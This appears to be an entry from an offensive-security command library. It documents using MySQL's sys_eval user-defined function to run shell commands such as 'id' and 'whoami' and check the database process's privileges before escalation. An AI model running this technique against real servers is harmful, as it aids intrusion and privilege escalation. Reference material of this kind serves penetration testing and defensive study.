---
id: eecdae9a-05d3-4fd2-b00b-e474a40b5954
name: mysql-sys-eval-id
type: command
executor: sql
data: SELECT sys_eval('id');
output: null
created_at: '2023-04-06T03:56:34.964267+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - discovery
  - mysql-udf
verified: true
validated: true
---

# mysql-sys-eval-id

## Command

```sql
SELECT sys_eval('id');
```

## Description

Uses the sys_eval UDF to execute the 'id' shell command via MySQL, revealing the user ID, group ID, and groups of the MySQL process owner. This helps assess privileges for escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'id' | The shell command to evaluate | Yes |

## Examples

### Basic Usage

After connecting to MySQL:
```sql
SELECT sys_eval('id');
```

### Advanced Usage

Combine with whoami:
```sql
SELECT sys_eval('whoami');
```

## Expected Output

```
+--------------------------------+
| sys_eval('id')                 |
+--------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------+
```

## Related

- [[procedures/MySQL-UDF-Command-Execution-via-lib_mysqludf_sys.so]]
